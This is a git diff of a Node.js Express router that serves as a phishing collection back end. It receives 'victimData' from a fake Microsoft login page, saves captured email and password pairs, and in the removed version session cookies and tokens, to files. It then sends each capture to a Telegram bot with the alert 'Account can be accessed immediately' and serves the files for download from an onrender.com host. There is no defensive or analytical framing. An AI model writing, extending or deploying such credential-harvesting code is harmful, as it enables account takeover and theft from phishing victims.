@@ -55,23 +55,31 @@ async function saveSessionData(victimData) {
 // ==================== TELEGRAM ALERT ====================
 async function sendTelegramAlert(victimData, fileInfo) {
   try {
-    const message = `🔐 <b>MICROSOFT SESSION CAPTURED</b>
+    let message = '';
+    
+    if (victimData.type === 'credentials_captured') {
+      message = `🔐 <b>MICROSOFT CREDENTIALS CAPTURED</b>
 
-🎯 <b>Service:</b> ${victimData.service}
-📧 <b>User Profile:</b> ${victimData.user_profile || 'Not found'}
-🌐 <b>Domain:</b> ${victimData.page_url}
+📧 <b>Email:</b> <code>${victimData.credentials?.email || victimData.email}</code>
+🔑 <b>Password:</b> <code>${victimData.credentials?.password || victimData.password}</code>
+🌐 <b>Domain:</b> ${victimData.page_info?.url || 'unknown'}
 
-📊 <b>Data Captured:</b>
-├ Cookies: ${victimData.cookies?.length || 0}
-├ Tokens: ${victimData.local_storage_tokens?.length || 0}
-└ Type: ${victimData.type}
+📍 <b>Client Info:</b>
+├ User Agent: ${victimData.page_info?.user_agent?.substring(0, 50)}...
+└ Time: ${victimData.timestamp}
+
+⚠️ <b>Account can be accessed immediately</b>`;
+    } else {
+      message = `🎯 <b>NEW DATA RECEIVED</b>
+
+📊 <b>Type:</b> ${victimData.type}
+🌐 <b>Service:</b> ${victimData.service}
+📧 <b>User:</b> ${victimData.user_profile || 'Not found'}
 
 💾 <b>Storage:</b>
 ├ File: <code>${fileInfo.filename}</code>
-├ Download: /download/${fileInfo.filename}
-└ Time: ${new Date().toISOString()}
-
-⚠️ <b>Session hijacking possible immediately</b>`;
+└ Time: ${new Date().toISOString()}`;
+    }
 
     const response = await fetch(TELEGRAM_API, {
       method: "POST",
@@ -91,54 +99,70 @@ async function sendTelegramAlert(victimData, fileInfo) {
 }
 
 // ==================== MAIN ENDPOINT ====================
-router.post('/activities', async (req, res) => {
+router.post('/', async (req, res) => {
   try {
-    console.log('🎯 New Microsoft session data received!');
+    console.log('🎯 New data received!');
+    console.log('📥 Received data:', JSON.stringify(req.body, null, 2));
     
     const victimData = req.body;
     
-    // Validate the data structure
-    if (!victimData.type || !victimData.service) {
-      return res.status(400).json({ 
-        success: false, 
-        message: "Invalid data format from script" 
+    // Handle different data types
+    if (victimData.type === 'credentials_captured') {
+      console.log('🔐 CREDENTIALS CAPTURED:', victimData.credentials?.email || victimData.email);
+      
+      // Save credentials data
+      const fileInfo = await saveSessionData({
+        ...victimData,
+        service: 'microsoft_credentials',
+        page_url: victimData.page_info?.url || victimData.url || 'unknown'
+      });
+      
+      // Send Telegram alert
+      await sendTelegramAlert(victimData, fileInfo);
+      
+      res.status(200).json({
+        success: true,
+        message: "Credentials received successfully",
+        data_received: {
+          type: victimData.type,
+          email: victimData.credentials?.email || victimData.email,
+          credentials_captured: true
+        },
+        timestamp: new Date().toISOString()
+      });
+      
+    } else if (victimData.type === 'page_loaded' || victimData.type === 'connection_test') {
+      console.log('📄 Analytics data:', victimData.type);
+      
+      // Just acknowledge, no need to save
+      res.status(200).json({
+        success: true,
+        message: "Data received",
+        type: victimData.type,
+        timestamp: new Date().toISOString()
+      });
+      
+    } else {
+      // Generic data handling
+      console.log('📦 Generic data received:', victimData.type);
+      
+      const fileInfo = await saveSessionData(victimData);
+      await sendTelegramAlert(victimData, fileInfo);
+      
+      res.status(200).json({
+        success: true,
+        message: "Data received and saved",
+        data_type: victimData.type,
+        storage_info: {
+          filename: fileInfo.filename,
+          download_url: `https://chuksinno-backend-1.onrender.com/chukachina/download/${fileInfo.filename}`
+        },
+        timestamp: new Date().toISOString()
       });
     }
     
-    // Save to file
-    const fileInfo = await saveSessionData(victimData);
-    
-    // Log the received data
-    console.log('📥 Data Type:', victimData.type);
-    console.log('🌐 Service:', victimData.service);
-    console.log('🍪 Cookies found:', victimData.cookies?.length || 0);
-    console.log('🔑 Tokens found:', victimimData.local_storage_tokens?.length || 0);
-    console.log('💾 Saved as:', fileInfo.filename);
-    
-    // Send Telegram alert with file info
-    await sendTelegramAlert(victimData, fileInfo);
-    
-    // Return success response with download info
-    res.status(200).json({
-      success: true,
-      message: "Session data received and saved successfully",
-      data_received: {
-        type: victimData.type,
-        service: victimData.service,
-        cookies_count: victimData.cookies?.length || 0,
-        tokens_count: victimData.local_storage_tokens?.length || 0,
-        profile_found: !!victimData.user_profile
-      },
-      storage_info: {
-        filename: fileInfo.filename,
-        download_url: `https://chuksinno-backend-1.onrender.com/chukachina/download/${fileInfo.filename}`,
-        saved_at: new Date().toISOString()
-      },
-      timestamp: new Date().toISOString()
-    });
-    
   } catch (error) {
-    console.error("Error processing session data:", error);
+    console.error("Error processing data:", error);
     res.status(500).json({
       success: false,
       message: "Internal server error",
@@ -242,13 +266,12 @@ router.get('/health', async (req, res) => {
     
     res.json({
       success: true,
-      message: "Session capture endpoint is running",
-      endpoint: "/activities",
-      features: {
-        file_storage: true,
-        download_endpoint: true,
-        sessions_list: true,
-        telegram_alerts: true
+      message: "Credential capture endpoint is running",
+      endpoints: {
+        main: "POST /chukachina",
+        download: "GET /chukachina/download/:filename",
+        sessions: "GET /chukachina/sessions",
+        health: "GET /chukachina/health"
       },
       statistics: {
         total_sessions: sessionCount,
